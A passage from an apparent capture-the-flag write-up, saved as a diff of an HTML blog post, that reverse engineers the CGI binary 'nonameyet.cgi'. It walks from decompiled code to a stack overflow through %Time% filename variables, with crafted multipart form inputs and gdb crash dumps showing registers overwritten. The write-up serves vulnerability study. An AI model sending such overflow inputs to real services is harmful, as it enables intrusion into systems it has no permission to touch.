+          <span class='k'>if</span> <span class='o'>(</span> <span class='n'>file_name_size</span> <span class='o'>&lt;=</span> <span class='n'>counter</span> <span class='o'>)</span>
+          <span class='o'>{</span>
+            <span class='n'>v20</span> <span class='o'>=</span> <span class='n'>mmap</span><span class='o'>(</span><span class='n'>v6</span><span class='o'>,</span> <span class='n'>edi0</span><span class='o'>,</span> <span class='o'>(</span><span class='kt'>int</span><span class='o'>)</span><span class='n'>a2</span><span class='o'>);</span>
+            <span class='n'>qmemcpy</span><span class='o'>((</span><span class='kt'>void</span> <span class='o'>*)</span><span class='n'>v20</span><span class='o'>,</span> <span class='n'>esp_ptr</span><span class='o'>,</span> <span class='n'>counter_1</span><span class='o'>);</span>
+            <span class='o'>*(</span><span class='n'>_DWORD</span> <span class='o'>*)</span><span class='n'>a1</span> <span class='o'>=</span> <span class='n'>v20</span><span class='o'>;</span>
+            <span class='n'>result</span> <span class='o'>=</span> <span class='n'>counter_1</span><span class='o'>;</span>
+            <span class='o'>*(</span><span class='n'>_DWORD</span> <span class='o'>*)(</span><span class='n'>a1</span> <span class='o'>+</span> <span class='mi'>4</span><span class='o'>)</span> <span class='o'>=</span> <span class='n'>counter_1</span><span class='o'>;</span>
+            <span class='k'>return</span> <span class='n'>result</span><span class='o'>;</span>
+          <span class='o'>}</span>
+        <span class='o'>}</span>
+      <span class='o'>}</span>
+      <span class='k'>switch</span> <span class='o'>(</span> <span class='n'>v9</span> <span class='o'>)</span>
+      <span class='o'>{</span>
+        <span class='k'>case</span> <span class='err'>&#39;</span><span class='n'>emiT</span><span class='err'>&#39;</span><span class='o'>:</span>
+          <span class='n'>v12</span> <span class='o'>=</span> <span class='o'>*(</span><span class='n'>_DWORD</span> <span class='o'>*)(</span><span class='n'>a1</span> <span class='o'>+</span> <span class='mi'>20</span><span class='o'>);</span>
+          <span class='n'>a2</span> <span class='o'>=</span> <span class='o'>*(</span><span class='kt'>char</span> <span class='o'>**)(</span><span class='n'>a1</span> <span class='o'>+</span> <span class='mi'>16</span><span class='o'>);</span>
+          <span class='k'>if</span> <span class='o'>(</span> <span class='n'>a2</span> <span class='o'>)</span>
+          <span class='o'>{</span>
+            <span class='n'>v13</span> <span class='o'>=</span> <span class='o'>(</span><span class='kt'>char</span> <span class='o'>*)</span><span class='n'>esp_ptr</span> <span class='o'>+</span> <span class='n'>counter_1</span><span class='o'>;</span>
+            <span class='n'>counter_1</span> <span class='o'>+=</span> <span class='n'>v12</span><span class='o'>;</span>
+            <span class='n'>qmemcpy</span><span class='o'>(</span><span class='n'>v13</span><span class='o'>,</span> <span class='n'>a2</span><span class='o'>,</span> <span class='n'>v12</span><span class='o'>);</span>
+            <span class='n'>a2</span> <span class='o'>+=</span> <span class='n'>v12</span><span class='o'>;</span>
+            <span class='n'>edi0</span> <span class='o'>=</span> <span class='o'>(</span><span class='kt'>int</span><span class='o'>)((</span><span class='kt'>char</span> <span class='o'>*)</span><span class='n'>v13</span> <span class='o'>+</span> <span class='n'>v12</span><span class='o'>);</span>
+            <span class='k'>goto</span> <span class='n'>LABEL_24</span><span class='o'>;</span>
+          <span class='o'>}</span>
+          <span class='k'>break</span><span class='o'>;</span>
+        <span class='k'>case</span> <span class='err'>&#39;</span><span class='n'>etaD</span><span class='err'>&#39;</span><span class='o'>:</span>
+          <span class='n'>v14</span> <span class='o'>=</span> <span class='o'>*(</span><span class='n'>_DWORD</span> <span class='o'>*)(</span><span class='n'>a1</span> <span class='o'>+</span> <span class='mi'>28</span><span class='o'>);</span>
+          <span class='n'>a2</span> <span class='o'>=</span> <span class='o'>*(</span><span class='kt'>char</span> <span class='o'>**)(</span><span class='n'>a1</span> <span class='o'>+</span> <span class='mi'>24</span><span class='o'>);</span>
+          <span class='k'>if</span> <span class='o'>(</span> <span class='n'>a2</span> <span class='o'>)</span>
+          <span class='o'>{</span>
+            <span class='n'>v15</span> <span class='o'>=</span> <span class='o'>(</span><span class='kt'>char</span> <span class='o'>*)</span><span class='n'>esp_ptr</span> <span class='o'>+</span> <span class='n'>counter_1</span><span class='o'>;</span>
+            <span class='n'>counter_1</span> <span class='o'>+=</span> <span class='n'>v14</span><span class='o'>;</span>
+            <span class='n'>qmemcpy</span><span class='o'>(</span><span class='n'>v15</span><span class='o'>,</span> <span class='n'>a2</span><span class='o'>,</span> <span class='n'>v14</span><span class='o'>);</span>
+            <span class='n'>a2</span> <span class='o'>+=</span> <span class='n'>v14</span><span class='o'>;</span>
+            <span class='n'>edi0</span> <span class='o'>=</span> <span class='o'>(</span><span class='kt'>int</span><span class='o'>)((</span><span class='kt'>char</span> <span class='o'>*)</span><span class='n'>v15</span> <span class='o'>+</span> <span class='n'>v14</span><span class='o'>);</span>
+            <span class='k'>goto</span> <span class='n'>LABEL_24</span><span class='o'>;</span>
+          <span class='o'>}</span>
+          <span class='k'>break</span><span class='o'>;</span>
+        <span class='k'>case</span> <span class='err'>&#39;</span><span class='n'>YxiP</span><span class='err'>&#39;</span><span class='o'>:</span>
+          <span class='n'>v16</span> <span class='o'>=</span> <span class='o'>*(</span><span class='n'>_DWORD</span> <span class='o'>*)(</span><span class='n'>a1</span> <span class='o'>+</span> <span class='mi'>36</span><span class='o'>);</span>
+          <span class='n'>a2</span> <span class='o'>=</span> <span class='o'>*(</span><span class='kt'>char</span> <span class='o'>**)(</span><span class='n'>a1</span> <span class='o'>+</span> <span class='mi'>32</span><span class='o'>);</span>
+          <span class='k'>if</span> <span class='o'>(</span> <span class='n'>a2</span> <span class='o'>)</span>
+          <span class='o'>{</span>
+            <span class='n'>v17</span> <span class='o'>=</span> <span class='o'>(</span><span class='kt'>char</span> <span class='o'>*)</span><span class='n'>esp_ptr</span> <span class='o'>+</span> <span class='n'>counter_1</span><span class='o'>;</span>
+            <span class='n'>counter_1</span> <span class='o'>+=</span> <span class='n'>v16</span><span class='o'>;</span>
+            <span class='n'>qmemcpy</span><span class='o'>(</span><span class='n'>v17</span><span class='o'>,</span> <span class='n'>a2</span><span class='o'>,</span> <span class='n'>v16</span><span class='o'>);</span>
+            <span class='n'>a2</span> <span class='o'>+=</span> <span class='n'>v16</span><span class='o'>;</span>
+            <span class='n'>edi0</span> <span class='o'>=</span> <span class='o'>(</span><span class='kt'>int</span><span class='o'>)((</span><span class='kt'>char</span> <span class='o'>*)</span><span class='n'>v17</span> <span class='o'>+</span> <span class='n'>v16</span><span class='o'>);</span>
+            <span class='k'>goto</span> <span class='n'>LABEL_24</span><span class='o'>;</span>
+          <span class='o'>}</span>
+          <span class='k'>break</span><span class='o'>;</span>
+        <span class='k'>case</span> <span class='err'>&#39;</span><span class='n'>XxiP</span><span class='err'>&#39;</span><span class='o'>:</span>
+          <span class='n'>v18</span> <span class='o'>=</span> <span class='o'>*(</span><span class='n'>_DWORD</span> <span class='o'>*)(</span><span class='n'>a1</span> <span class='o'>+</span> <span class='mi'>44</span><span class='o'>);</span>
+          <span class='n'>a2</span> <span class='o'>=</span> <span class='o'>*(</span><span class='kt'>char</span> <span class='o'>**)(</span><span class='n'>a1</span> <span class='o'>+</span> <span class='mi'>40</span><span class='o'>);</span>
+          <span class='k'>if</span> <span class='o'>(</span> <span class='n'>a2</span> <span class='o'>)</span>
+          <span class='o'>{</span>
+            <span class='n'>v19</span> <span class='o'>=</span> <span class='o'>(</span><span class='kt'>char</span> <span class='o'>*)</span><span class='n'>esp_ptr</span> <span class='o'>+</span> <span class='n'>counter_1</span><span class='o'>;</span>
+            <span class='n'>counter_1</span> <span class='o'>+=</span> <span class='n'>v18</span><span class='o'>;</span>
+            <span class='n'>qmemcpy</span><span class='o'>(</span><span class='n'>v19</span><span class='o'>,</span> <span class='n'>a2</span><span class='o'>,</span> <span class='n'>v18</span><span class='o'>);</span>
+            <span class='n'>a2</span> <span class='o'>+=</span> <span class='n'>v18</span><span class='o'>;</span>
+            <span class='n'>edi0</span> <span class='o'>=</span> <span class='o'>(</span><span class='kt'>int</span><span class='o'>)((</span><span class='kt'>char</span> <span class='o'>*)</span><span class='n'>v19</span> <span class='o'>+</span> <span class='n'>v18</span><span class='o'>);</span>
+            <span class='k'>goto</span> <span class='n'>LABEL_24</span><span class='o'>;</span>
+          <span class='o'>}</span>
+          <span class='k'>break</span><span class='o'>;</span>
+      <span class='o'>}</span>
+    <span class='o'>}</span>
+  <span class='o'>}</span>
+  <span class='k'>return</span> <span class='n'>result</span><span class='o'>;</span>
+<span class='o'>}</span>
+</code></pre></div>
+<p>There are a few things that jump out at me right away. The first is the use of the alloca() function. The man page for alloca states “The alloca() function allocates size bytes of space in the stack frame of the caller. This temporary space is automatically freed when the function that called alloca() returns to its caller.” Thus, we are dynamically growing the stack based upon file_name_size. This function call ends up being just a “sub esp” instruction in the assembly code, so don’t expect to see an import to alloca in the ELF header.</p>
+
+<p>The next thing I notice are the case statements looking for 4 character string patterns of: Genr, Time, Date, PixY, and PixX. IDA shows these in little endian (backwards) format. The program checks for % characters in the filename input that are followed by another % character 4 character later. Thus, we are looking for DOS style variables like %Genr%. It turns out all of these variables are passed in as the third argument to the interesting function.</p>
+
+<p>They are built into a structure that is 0x30 bytes long. First the sizes are built with calls to v3 = cgiGetValue((int)s_cgi, “base”); and the like. Then the strings for the variables are built immediately before the sizes. The IDA decompilation of the main function does not identify this as a structure. However, the memset(&amp;v3, 0, 0x30u); and the fact that only v3 is passed into a function that clearly needs all of these variables is a big clue that this is a structure, or an array of structures, instead of 12 individual variables. The v3 variable in main() (or a1 in interesting()) ends up looking like this:</p>
+<div class='highlight'><pre><code class='java'><span class='n'>struct</span> <span class='n'>v3</span> <span class='o'>{</span>
+	<span class='kt'>char</span> <span class='o'>*</span> <span class='n'>filename</span><span class='o'>;</span>
+	<span class='n'>unsigned</span> <span class='kt'>int</span> <span class='n'>file_name_size</span><span class='o'>;</span>
+	<span class='kt'>char</span> <span class='o'>*</span> <span class='n'>genr_str</span><span class='o'>;</span>
+	<span class='n'>unsigned</span> <span class='kt'>int</span> <span class='n'>genr_size</span><span class='o'>;</span>
+	<span class='kt'>char</span> <span class='o'>*</span> <span class='n'>time_str</span><span class='o'>;</span>
+	<span class='n'>unsigned</span> <span class='kt'>int</span> <span class='n'>time_size</span><span class='o'>;</span>
+	<span class='kt'>char</span> <span class='o'>*</span> <span class='n'>date_str</span><span class='o'>;</span>
+	<span class='n'>unsigned</span> <span class='kt'>int</span> <span class='n'>date_size</span><span class='o'>;</span>
+	<span class='kt'>char</span> <span class='o'>*</span> <span class='n'>pixy_str</span><span class='o'>;</span>
+	<span class='n'>unsigned</span> <span class='kt'>int</span> <span class='n'>pixy_size</span><span class='o'>;</span>
+	<span class='kt'>char</span> <span class='o'>*</span> <span class='n'>pixx_str</span><span class='o'>;</span>
+	<span class='n'>unsigned</span> <span class='kt'>int</span> <span class='n'>pixx_size</span><span class='o'>;</span>
+<span class='o'>};</span>
+</code></pre></div>
+<p>Have you spotted the bug yet? If not, go back to what is happening with our input in the interesting function. We pass this structure into our function, alloca (file_name_size * 2) and then what? We start copying into this array. It’s the qmemcpy calls that are in question here. These are presented in assembly as rep movsb instructions. Ask yourself how much data is being copied and what is the size of the destination buffer? Do you control the data being copied into the buffer? What variables are being updated in the loops to affect the starting offsets of the copy? Study the code and see if you can answer some of these questions. Do it now, I will wait.</p>
+
+<h3 id="vulnerability_discovery">Vulnerability Discovery</h3>
+
+<p>What you might notice is that after the program takes the length of file_name, doubles it, and allocates that amount of space on the stack, it will then proceed to copy in the values for the other variables from the structure. For example, if I set the filename “foobar” (name=”photo”; filename=”foobar” in my formdata file) and then if I set the Time input to be AAAAAA the CGI program will allocate 14 bytes on the stack (length of “foobar\0” * 2) and then copy in the value of the %Time% variable, which would also be 6 bytes. This will be clearer when looking at the actual input file.</p>
+
+<p>The bug comes in if we make the length of Time larger than the length of file_name while having file_name reference %Time%. There is no check to see if we have enough stack space left. This is a stack overflow. The only issue is that if we try to encode a %Time% variable directly into the file_name then the program never gets to the interesting function! For clarity, this is what the formdata file looks like now for testing:</p>
+<div class='highlight'><pre><code class='java'><span class='o'>-----------------------------</span><span class='mi'>13141138687192</span>
+<span class='n'>Content</span><span class='o'>-</span><span class='nl'>Disposition:</span> <span class='n'>form</span><span class='o'>-</span><span class='n'>data</span><span class='o'>;</span> <span class='n'>name</span><span class='o'>=</span><span class='s'>&quot;photo&quot;</span><span class='o'>;</span> <span class='n'>filename</span><span class='o'>=</span><span class='s'>&quot;%Time%&quot;</span>
+<span class='n'>Content</span><span class='o'>-</span><span class='nl'>Type:</span> <span class='n'>application</span><span class='o'>/</span><span class='n'>octet</span><span class='o'>-</span><span class='n'>stream</span>
+
+<span class='n'>file</span> <span class='n'>contents</span>
+
+<span class='o'>-----------------------------</span><span class='mi'>13141138687192</span>
+<span class='o'>-----------------------------</span><span class='mi'>13141138687192</span>
+<span class='n'>Content</span><span class='o'>-</span><span class='nl'>Disposition:</span> <span class='n'>form</span><span class='o'>-</span><span class='n'>data</span><span class='o'>;</span> <span class='n'>name</span><span class='o'>=</span><span class='s'>&quot;Time&quot;</span>
+
+<span class='n'>AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span>
+<span class='o'>-----------------------------</span><span class='mi'>13141138687192</span><span class='o'>--</span>
+</code></pre></div>
+<p>The %Time% bit does not parse correctly and we miss the check for % in the filename. This is because the variables are being URL decoded. If I set it to %25Time%25 it will decode properly as %Time% (0x25 = ‘%’). The other problem I ran into with this input is that although the %Time% variable is case sensitive when the time pointers and sizes are actually set in the structure it is looked up with lower case only. So, name=”time” and filename=”%25Time%25” will produce the following crash:</p>
+<div class='highlight'><pre><code class='java'><span class='n'>$</span> <span class='n'>gdb</span> <span class='o'>./</span><span class='n'>nonameyet</span><span class='o'>.</span><span class='na'>cgi</span>
+<span class='n'>Reading</span> <span class='n'>symbols</span> <span class='n'>from</span> <span class='o'>./</span><span class='n'>nonameyet</span><span class='o'>.</span><span class='na'>cgi</span><span class='o'>...(</span><span class='n'>no</span> <span class='n'>debugging</span> <span class='n'>symbols</span> <span class='n'>found</span><span class='o'>)...</span><span class='na'>done</span><span class='o'>.</span>
+<span class='n'>gdb</span><span class='o'>-</span><span class='n'>peda$</span> <span class='n'>set</span> <span class='n'>args</span> <span class='o'>&lt;</span> <span class='n'>formdata</span>
+<span class='n'>gdb</span><span class='o'>-</span><span class='n'>peda$</span> <span class='n'>r</span>
+<span class='n'>Starting</span> <span class='nl'>program:</span> <span class='o'>/</span><span class='n'>home</span><span class='o'>/</span><span class='n'>bool</span><span class='o'>/</span><span class='n'>nonameyet</span><span class='o'>.</span><span class='na'>cgi</span> <span class='o'>&lt;</span> <span class='n'>formdata</span>
+
+<span class='n'>Program</span> <span class='n'>received</span> <span class='n'>signal</span> <span class='n'>SIGSEGV</span><span class='o'>,</span> <span class='n'>Segmentation</span> <span class='n'>fault</span><span class='o'>.</span>
+<span class='o'>[----------------------------------</span><span class='n'>registers</span><span class='o'>-----------------------------------]</span>
+<span class='nl'>EAX:</span> <span class='mh'>0xb7fd9000</span> <span class='o'>--&gt;</span> <span class='mh'>0x0</span>
+<span class='nl'>EBX:</span> <span class='mh'>0x1000</span>
+<span class='nl'>ECX:</span> <span class='mh'>0x41414141</span> <span class='o'>(</span><span class='err'>&#39;</span><span class='n'>AAAA</span><span class='err'>&#39;</span><span class='o'>)</span>
+<span class='nl'>EDX:</span> <span class='mh'>0x80500a6</span> <span class='o'>--&gt;</span> <span class='mh'>0x0</span>
+<span class='nl'>ESI:</span> <span class='mh'>0x41414141</span> <span class='o'>(</span><span class='err'>&#39;</span><span class='n'>AAAA</span><span class='err'>&#39;</span><span class='o'>)</span>
+<span class='nl'>EDI:</span> <span class='mh'>0xb7fd9000</span> <span class='o'>--&gt;</span> <span class='mh'>0x0</span>
+<span class='nl'>EBP:</span> <span class='mh'>0xbffff638</span> <span class='o'>(</span><span class='sc'>&#39;A&#39;</span> <span class='o'>&lt;</span><span class='n'>repeats</span> <span class='mi'>46</span> <span class='n'>times</span><span class='o'>&gt;)</span>
+<span class='nl'>ESP:</span> <span class='mh'>0xbffff60a</span> <span class='o'>(</span><span class='sc'>&#39;A&#39;</span> <span class='o'>&lt;</span><span class='n'>repeats</span> <span class='mi'>92</span> <span class='n'>times</span><span class='o'>&gt;)</span>
+<span class='nl'>EIP:</span> <span class='mh'>0x804cfa2</span> <span class='o'>(</span><span class='n'>rep</span> <span class='n'>movs</span> <span class='n'>BYTE</span> <span class='n'>PTR</span> <span class='nl'>es:</span><span class='o'>[</span><span class='n'>edi</span><span class='o'>],</span><span class='n'>BYTE</span> <span class='n'>PTR</span> <span class='nl'>ds:</span><span class='o'>[</span><span class='n'>esi</span><span class='o'>])</span>
+<span class='nl'>EFLAGS:</span> <span class='mh'>0x10206</span> <span class='o'>(</span><span class='n'>carry</span> <span class='n'>PARITY</span> <span class='n'>adjust</span> <span class='n'>zero</span> <span class='n'>sign</span> <span class='n'>trap</span> <span class='n'>INTERRUPT</span> <span class='n'>direction</span> <span class='n'>overflow</span><span class='o'>)</span>
+<span class='o'>[-------------------------------------</span><span class='n'>code</span><span class='o'>-------------------------------------]</span>
+   <span class='mh'>0x804cf9a</span><span class='o'>:</span>   <span class='n'>mov</span>    <span class='n'>edi</span><span class='o'>,</span><span class='n'>eax</span>
+   <span class='mh'>0x804cf9c</span><span class='o'>:</span>   <span class='n'>mov</span>    <span class='n'>esi</span><span class='o'>,</span><span class='n'>DWORD</span> <span class='n'>PTR</span> <span class='o'>[</span><span class='n'>ebp</span><span class='o'>-</span><span class='mh'>0x14</span><span class='o'>]</span>
+   <span class='mh'>0x804cf9f</span><span class='o'>:</span>   <span class='n'>mov</span>    <span class='n'>ecx</span><span class='o'>,</span><span class='n'>DWORD</span> <span class='n'>PTR</span> <span class='o'>[</span><span class='n'>ebp</span><span class='o'>-</span><span class='mh'>0x18</span><span class='o'>]</span>
+<span class='o'>=&gt;</span> <span class='mh'>0x804cfa2</span><span class='o'>:</span>   <span class='n'>rep</span> <span class='n'>movs</span> <span class='n'>BYTE</span> <span class='n'>PTR</span> <span class='nl'>es:</span><span class='o'>[</span><span class='n'>edi</span><span class='o'>],</span><span class='n'>BYTE</span> <span class='n'>PTR</span> <span class='nl'>ds:</span><span class='o'>[</span><span class='n'>esi</span><span class='o'>]</span>
+   <span class='mh'>0x804cfa4</span><span class='o'>:</span>   <span class='n'>mov</span>    <span class='n'>ebx</span><span class='o'>,</span><span class='n'>DWORD</span> <span class='n'>PTR</span> <span class='o'>[</span><span class='n'>ebp</span><span class='o'>+</span><span class='mh'>0x8</span><span class='o'>]</span>
+   <span class='mh'>0x804cfa7</span><span class='o'>:</span>   <span class='n'>mov</span>    <span class='n'>DWORD</span> <span class='n'>PTR</span> <span class='o'>[</span><span class='n'>ebx</span><span class='o'>],</span><span class='n'>eax</span>
+   <span class='mh'>0x804cfa9</span><span class='o'>:</span>   <span class='n'>mov</span>    <span class='n'>eax</span><span class='o'>,</span><span class='n'>DWORD</span> <span class='n'>PTR</span> <span class='o'>[</span><span class='n'>ebp</span><span class='o'>-</span><span class='mh'>0x18</span><span class='o'>]</span>
+   <span class='mh'>0x804cfac</span><span class='o'>:</span>   <span class='n'>mov</span>    <span class='n'>DWORD</span> <span class='n'>PTR</span> <span class='o'>[</span><span class='n'>ebx</span><span class='o'>+</span><span class='mh'>0x4</span><span class='o'>],</span><span class='n'>eax</span>
+<span class='o'>[------------------------------------</span><span class='n'>stack</span><span class='o'>-------------------------------------]</span>
+<span class='mi'>0000</span><span class='o'>|</span> <span class='mh'>0xbffff60a</span> <span class='o'>(</span><span class='sc'>&#39;A&#39;</span> <span class='o'>&lt;</span><span class='n'>repeats</span> <span class='mi'>92</span> <span class='n'>times</span><span class='o'>&gt;)</span>
+<span class='mi'>0004</span><span class='o'>|</span> <span class='mh'>0xbffff60e</span> <span class='o'>(</span><span class='sc'>&#39;A&#39;</span> <span class='o'>&lt;</span><span class='n'>repeats</span> <span class='mi'>88</span> <span class='n'>times</span><span class='o'>&gt;)</span>
+<span class='mi'>0008</span><span class='o'>|</span> <span class='mh'>0xbffff612</span> <span class='o'>(</span><span class='sc'>&#39;A&#39;</span> <span class='o'>&lt;</span><span class='n'>repeats</span> <span class='mi'>84</span> <span class='n'>times</span><span class='o'>&gt;)</span>
+<span class='mi'>0012</span><span class='o'>|</span> <span class='mh'>0xbffff616</span> <span class='o'>(</span><span class='sc'>&#39;A&#39;</span> <span class='o'>&lt;</span><span class='n'>repeats</span> <span class='mi'>80</span> <span class='n'>times</span><span class='o'>&gt;)</span>
+<span class='mi'>0016</span><span class='o'>|</span> <span class='mh'>0xbffff61a</span> <span class='o'>(</span><span class='sc'>&#39;A&#39;</span> <span class='o'>&lt;</span><span class='n'>repeats</span> <span class='mi'>76</span> <span class='n'>times</span><span class='o'>&gt;)</span>
+<span class='mi'>0020</span><span class='o'>|</span> <span class='mh'>0xbffff61e</span> <span class='o'>(</span><span class='sc'>&#39;A&#39;</span> <span class='o'>&lt;</span><span class='n'>repeats</span> <span class='mi'>72</span> <span class='n'>times</span><span class='o'>&gt;)</span>
+<span class='mi'>0024</span><span class='o'>|</span> <span class='mh'>0xbffff622</span> <span class='o'>(</span><span class='sc'>&#39;A&#39;</span> <span class='o'>&lt;</span><span class='n'>repeats</span> <span class='mi'>68</span> <span class='n'>times</span><span class='o'>&gt;)</span>
+<span class='mi'>0028</span><span class='o'>|</span> <span class='mh'>0xbffff626</span> <span class='o'>(</span><span class='sc'>&#39;A&#39;</span> <span class='o'>&lt;</span><span class='n'>repeats</span> <span class='mi'>64</span> <span class='n'>times</span><span class='o'>&gt;)</span>
+<span class='o'>[------------------------------------------------------------------------------]</span>
+<span class='nl'>Legend:</span> <span class='n'>code</span><span class='o'>,</span> <span class='n'>data</span><span class='o'>,</span> <span class='n'>rodata</span><span class='o'>,</span> <span class='n'>value</span>
+<span class='n'>Stopped</span> <span class='nl'>reason:</span> <span class='n'>SIGSEGV</span>
+<span class='mh'>0x0804cfa2</span> <span class='n'>in</span> <span class='o'>??</span> <span class='o'>()</span>
+<span class='n'>gdb</span><span class='o'>-</span><span class='n'>peda$</span>
+</code></pre></div>
+<p>Huzzah! We’ve exercised the stack overflow and crashed on a memcpy(). If we can get the function to return we will have control over EIP. We are actually really close to the function return at this point as well. The ret instruction is at 0x0804CFB0, just a short 14 bytes away.</p>
+
+<p>Let’s see if we can get around this crash. The rep movs instruction will move ECX number of bytes from the pointer in ESI to the pointer in EDI. Here, ECX is set to 0x41414141. Clearly we overwrote the size used in this copy. We could look at the stack frame and do the math with the allocas to figure out exactly which offset the counter is coming from, but it is faster to just put in a string pattern in the time variable.</p>
+
+<p>We run it again with formdata of:</p>
+<div class='highlight'><pre><code class='java'><span class='n'>$</span> <span class='n'>cat</span> <span class='n'>formdata</span>
+<span class='o'>-----------------------------</span><span class='mi'>13141138687192</span>
+<span class='n'>Content</span><span class='o'>-</span><span class='nl'>Disposition:</span> <span class='n'>form</span><span class='o'>-</span><span class='n'>data</span><span class='o'>;</span> <span class='n'>name</span><span class='o'>=</span><span class='s'>&quot;photo&quot;</span><span class='o'>;</span> <span class='n'>filename</span><span class='o'>=</span><span class='s'>&quot;%25Time%25&quot;</span>
+<span class='n'>Content</span><span class='o'>-</span><span class='nl'>Type:</span> <span class='n'>application</span><span class='o'>/</span><span class='n'>octet</span><span class='o'>-</span><span class='n'>stream</span>
+
+<span class='n'>file</span> <span class='n'>contents</span>
+
+<span class='o'>-----------------------------</span><span class='mi'>13141138687192</span>
+<span class='n'>Content</span><span class='o'>-</span><span class='nl'>Disposition:</span> <span class='n'>form</span><span class='o'>-</span><span class='n'>data</span><span class='o'>;</span> <span class='n'>name</span><span class='o'>=</span><span class='s'>&quot;time&quot;</span>
+
+<span class='n'>AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVV</span>
+<span class='o'>-----------------------------</span><span class='mi'>13141138687192</span><span class='err'>—</span>
+</code></pre></div>
+<p>Debugging this gives us the following:</p>
+<div class='highlight'><pre><code class='java'><span class='n'>$</span> <span class='n'>gdb</span> <span class='o'>./</span><span class='n'>nonameyet</span><span class='o'>.</span><span class='na'>cgi</span>
+<span class='n'>Reading</span> <span class='n'>symbols</span> <span class='n'>from</span> <span class='o'>./</span><span class='n'>nonameyet</span><span class='o'>.</span><span class='na'>cgi</span><span class='o'>...(</span><span class='n'>no</span> <span class='n'>debugging</span> <span class='n'>symbols</span> <span class='n'>found</span><span class='o'>)...</span><span class='na'>done</span><span class='o'>.</span>
+<span class='n'>gdb</span><span class='o'>-</span><span class='n'>peda$</span> <span class='n'>set</span> <span class='n'>args</span> <span class='o'>&lt;</span> <span class='n'>formdata</span>
+<span class='n'>gdb</span><span class='o'>-</span><span class='n'>peda$</span> <span class='n'>r</span>
+<span class='n'>Starting</span> <span class='nl'>program:</span> <span class='o'>/</span><span class='n'>home</span><span class='o'>/</span><span class='n'>bool</span><span class='o'>/</span><span class='n'>nonameyet</span><span class='o'>.</span><span class='na'>cgi</span> <span class='o'>&lt;</span> <span class='n'>formdata</span>
+
+<span class='n'>Program</span> <span class='n'>received</span> <span class='n'>signal</span> <span class='n'>SIGSEGV</span><span class='o'>,</span> <span class='n'>Segmentation</span> <span class='n'>fault</span><span class='o'>.</span>
+<span class='o'>[----------------------------------</span><span class='n'>registers</span><span class='o'>-----------------------------------]</span>
+<span class='nl'>EAX:</span> <span class='mh'>0xb7fd9000</span> <span class='o'>--&gt;</span> <span class='mh'>0x0</span>
+<span class='nl'>EBX:</span> <span class='mh'>0x1000</span>
+<span class='nl'>ECX:</span> <span class='mh'>0x47474646</span> <span class='o'>(</span><span class='err'>&#39;</span><span class='n'>FFGG</span><span class='err'>&#39;</span><span class='o'>)</span>
+<span class='nl'>EDX:</span> <span class='mh'>0x80500a6</span> <span class='o'>--&gt;</span> <span class='mh'>0x0</span>
+<span class='nl'>ESI:</span> <span class='mh'>0x48484747</span> <span class='o'>(</span><span class='err'>&#39;</span><span class='n'>GGHH</span><span class='err'>&#39;</span><span class='o'>)</span>
+<span class='nl'>EDI:</span> <span class='mh'>0xb7fd9000</span> <span class='o'>--&gt;</span> <span class='mh'>0x0</span>
+<span class='nl'>EBP:</span> <span class='mh'>0xbffff638</span> <span class='o'>(</span><span class='s'>&quot;LLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVV&quot;</span><span class='o'>)</span>
+<span class='nl'>ESP:</span> <span class='mh'>0xbffff60a</span> <span class='o'>(</span><span class='s'>&quot;AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVV&quot;</span><span class='o'>)</span>
+<span class='nl'>EIP:</span> <span class='mh'>0x804cfa2</span> <span class='o'>(</span><span class='n'>rep</span> <span class='n'>movs</span> <span class='n'>BYTE</span> <span class='n'>PTR</span> <span class='nl'>es:</span><span class='o'>[</span><span class='n'>edi</span><span class='o'>],</span><span class='n'>BYTE</span> <span class='n'>PTR</span> <span class='nl'>ds:</span><span class='o'>[</span><span class='n'>esi</span><span class='o'>])</span>
+<span class='nl'>EFLAGS:</span> <span class='mh'>0x10206</span> <span class='o'>(</span><span class='n'>carry</span> <span class='n'>PARITY</span> <span class='n'>adjust</span> <span class='n'>zero</span> <span class='n'>sign</span> <span class='n'>trap</span> <span class='n'>INTERRUPT</span> <span class='n'>direction</span> <span class='n'>overflow</span><span class='o'>)</span>
+<span class='o'>[-------------------------------------</span><span class='n'>code</span><span class='o'>-------------------------------------]</span>
+   <span class='mh'>0x804cf9a</span><span class='o'>:</span>   <span class='n'>mov</span>    <span class='n'>edi</span><span class='o'>,</span><span class='n'>eax</span>
+   <span class='mh'>0x804cf9c</span><span class='o'>:</span>   <span class='n'>mov</span>    <span class='n'>esi</span><span class='o'>,</span><span class='n'>DWORD</span> <span class='n'>PTR</span> <span class='o'>[</span><span class='n'>ebp</span><span class='o'>-</span><span class='mh'>0x14</span><span class='o'>]</span>
+   <span class='mh'>0x804cf9f</span><span class='o'>:</span>   <span class='n'>mov</span>    <span class='n'>ecx</span><span class='o'>,</span><span class='n'>DWORD</span> <span class='n'>PTR</span> <span class='o'>[</span><span class='n'>ebp</span><span class='o'>-</span><span class='mh'>0x18</span><span class='o'>]</span>
+<span class='o'>=&gt;</span> <span class='mh'>0x804cfa2</span><span class='o'>:</span>   <span class='n'>rep</span> <span class='n'>movs</span> <span class='n'>BYTE</span> <span class='n'>PTR</span> <span class='nl'>es:</span><span class='o'>[</span><span class='n'>edi</span><span class='o'>],</span><span class='n'>BYTE</span> <span class='n'>PTR</span> <span class='nl'>ds:</span><span class='o'>[</span><span class='n'>esi</span><span class='o'>]</span>
+   <span class='mh'>0x804cfa4</span><span class='o'>:</span>   <span class='n'>mov</span>    <span class='n'>ebx</span><span class='o'>,</span><span class='n'>DWORD</span> <span class='n'>PTR</span> <span class='o'>[</span><span class='n'>ebp</span><span class='o'>+</span><span class='mh'>0x8</span><span class='o'>]</span>
+   <span class='mh'>0x804cfa7</span><span class='o'>:</span>   <span class='n'>mov</span>    <span class='n'>DWORD</span> <span class='n'>PTR</span> <span class='o'>[</span><span class='n'>ebx</span><span class='o'>],</span><span class='n'>eax</span>
